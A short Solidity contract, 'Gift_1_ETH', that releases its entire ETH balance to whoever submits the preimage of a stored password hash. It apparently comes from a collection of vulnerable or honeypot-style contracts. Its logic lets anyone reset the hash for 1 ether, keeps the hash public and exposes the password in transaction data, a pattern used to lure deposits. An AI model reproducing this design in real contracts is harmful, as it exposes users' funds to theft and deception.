// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;


contract Gift_1_ETH
{
    bool passHasBeenSet = false;

    fallback() external payable {}

    function GetHash(bytes memory pass) public view returns (bytes32) {return keccak256(abi.encodePacked(pass));}

    bytes32 public hashPass;

    function SetPass(bytes32 hash)
    public
    payable
    {
        if(!passHasBeenSet&&(msg.value >= 1 ether))
        {
            hashPass = hash;
        }
    }

    function GetGift(bytes memory pass)
    external
    payable
    {
        if(hashPass == keccak256(abi.encodePacked(pass)))
        {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    function PassHasBeenSet(bytes32 hash)
    public
    {
        if(hash==hashPass)
        {
           passHasBeenSet=true;
        }
    }
}
